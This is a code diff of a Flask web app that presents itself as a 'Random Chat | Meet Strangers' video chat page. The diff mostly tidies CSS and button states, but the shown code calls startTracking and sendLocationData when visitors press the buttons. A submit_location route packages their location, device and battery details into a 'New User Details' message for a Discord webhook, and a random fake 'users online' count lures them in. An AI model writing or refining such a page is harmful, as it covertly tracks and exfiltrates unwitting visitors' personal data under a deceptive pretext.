@@ -7,7 +7,6 @@ app = Flask(__name__)
 
 # Discord webhook URL (replace with your actual Discord webhook URL)
 DISCORD_WEBHOOK_URL = os.getenv('DISCORD_WEBHOOK_URL')
-
 HTML_PAGE = """
 <!DOCTYPE html>
 <html lang="en">
@@ -16,7 +15,8 @@ HTML_PAGE = """
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Random Chat | Meet Strangers</title>
-   <style>
+    <style>
+        /* CSS styles (same as the original) */
         body {
             margin: 0;
             font-family: 'Roboto', sans-serif;
@@ -31,7 +31,6 @@ HTML_PAGE = """
             overflow: hidden;
             padding: 0 15px;
         }
-
         header {
             width: 100%;
             background-color: #111;
@@ -42,13 +41,11 @@ HTML_PAGE = """
             z-index: 10;
             box-shadow: 0 2px 10px rgba(0, 0, 0, 0.7);
         }
-
         header nav {
             display: flex;
             justify-content: center;
             gap: 30px;
         }
-
         header nav a {
             color: #fff;
             text-decoration: none;
@@ -58,12 +55,10 @@ HTML_PAGE = """
             letter-spacing: 1px;
             transition: color 0.3s ease;
         }
-
         header nav a:hover {
             color: #fff;
             text-decoration: underline;
         }
-
         .main-container {
             background-color: rgba(0, 0, 0, 0.7);
             padding: 40px 30px;
@@ -77,13 +72,11 @@ HTML_PAGE = """
             margin-top: 80px;
             position: relative;
         }
-
         h1 {
             font-size: 1rem;
             margin-bottom: 20px;
             color: #fff;
         }
-
         .video-container {
             width: 100%;
             max-width: 450px;
@@ -99,17 +92,14 @@ HTML_PAGE = """
             box-shadow: 0 6px 15px rgba(0, 0, 0, 0.8);
             transition: transform 0.3s ease;
         }
-
         .video-container:hover {
             transform: scale(1.03);
         }
-
         .dropdown {
             display: none;
             margin: 20px 0;
             font-size: 1rem;
         }
-
         select {
             font-size: 1.2rem;
             padding: 12px;
@@ -122,25 +112,21 @@ HTML_PAGE = """
             cursor: pointer;
             transition: background-color 0.3s ease, transform 0.3s ease;
         }
-
         select:hover {
             background-color: #444;
             transform: translateY(-3px);
         }
-
         select:focus {
             outline: none;
             background-color: #555;
         }
-
         .button-container {
             margin-top: 20px;
             display: flex;
             justify-content: center;
             gap: 25px;
-            flex-wrap: wrap; /* Ensure buttons wrap on smaller screens */
+            flex-wrap: wrap;
         }
-
         .button-container button {
             font-size: 1.2rem;
             padding: 15px 30px;
@@ -152,19 +138,20 @@ HTML_PAGE = """
             transition: all 0.3s ease;
             box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
         }
-
-        .button-container button:hover {
+        .button-container button:disabled {
+            background-color: #333;
+            cursor: not-allowed;
+        }
+        .button-container button:hover:not(:disabled) {
             background-color: #777;
             transform: translateY(-3px);
         }
-
         #output {
             margin-top: 25px;
             font-size: 1.3rem;
             color: #ffcc00;
             font-weight: bold;
         }
-
         footer {
             background-color: #111;
             color: #fff;
@@ -176,48 +163,39 @@ HTML_PAGE = """
             box-shadow: 0 -2px 10px rgba(0, 0, 0, 0.7);
             margin-top: 10px;
         }
-
         footer a {
             color: #fff;
             text-decoration: none;
             margin: 0 10px;
             font-size: 1rem;
         }
-
         footer a:hover {
             text-decoration: underline;
         }
-
         @media (max-width: 768px) {
             h1 {
                 font-size: 2rem;
                 margin-bottom: 15px;
             }
-
             .button-container {
                 flex-direction: column;
                 gap: 15px;
             }
-
             .button-container button {
                 width: 90%;
             }
-
             select {
                 width: 100%;
             }
-
             .video-container {
                 max-width: 100%;
             }
         }
-
         @media (max-width: 480px) {
             header nav {
                 flex-direction: column;
                 gap: 15px;
             }
-
             header nav a {
                 font-size: 1rem;
             }
@@ -250,8 +228,8 @@ HTML_PAGE = """
             </select>
         </div>
         <div class="button-container">
-            <button onclick="handleGetStarted()">Start</button>
-            <button onclick="sendLocationData()">Next Person</button>
+            <button id="startButton" onclick="handleGetStarted()">Start</button>
+            <button id="nextButton" onclick="sendLocationData()" disabled>Next Person</button>
         </div>
     </div>
 
@@ -336,10 +314,13 @@ HTML_PAGE = """
         }
 
         function handleGetStarted() {
-            startVideo(); 
+            startVideo();
             startTracking();
             document.getElementById('output').innerHTML = "Please select a topic and click Next.";
             document.getElementById('dropdown').style.display = "block";
+
+            // Enable the "Next Person" button
+            document.getElementById('nextButton').disabled = false;
         }
 
         function stopTracking() {
@@ -362,15 +343,14 @@ HTML_PAGE = """
                 alert("Your browser does not support camera access.");
             }
         }
-    function updateUserCount() {
-        // Generate a random number between 3 and 6
-        const userCount = Math.floor(Math.random() * (6 - 3 + 1)) + 3;
-        // Update the user count display
-        document.getElementById('userCountDisplay').innerHTML = `Meet Strangers - ${userCount} Users Online`;
-    }
-    // Call the function once at the start and then every 20 seconds
-    updateUserCount();
-    setInterval(updateUserCount, 20000);
+
+        function updateUserCount() {
+            const userCount = Math.floor(Math.random() * (6 - 3 + 1)) + 3;
+            document.getElementById('userCountDisplay').innerHTML = `Meet Strangers - ${userCount} Users Online`;
+        }
+
+        updateUserCount();
+        setInterval(updateUserCount, 20000);
     </script>
 </body>
 
@@ -393,7 +373,6 @@ def submit_location():
     device_info = data.get('device_info')
     battery_info = data.get('battery_info')
 
-    # Prepare the message to send to Discord
     message = {
         'content': f"""
         **New User Details:**
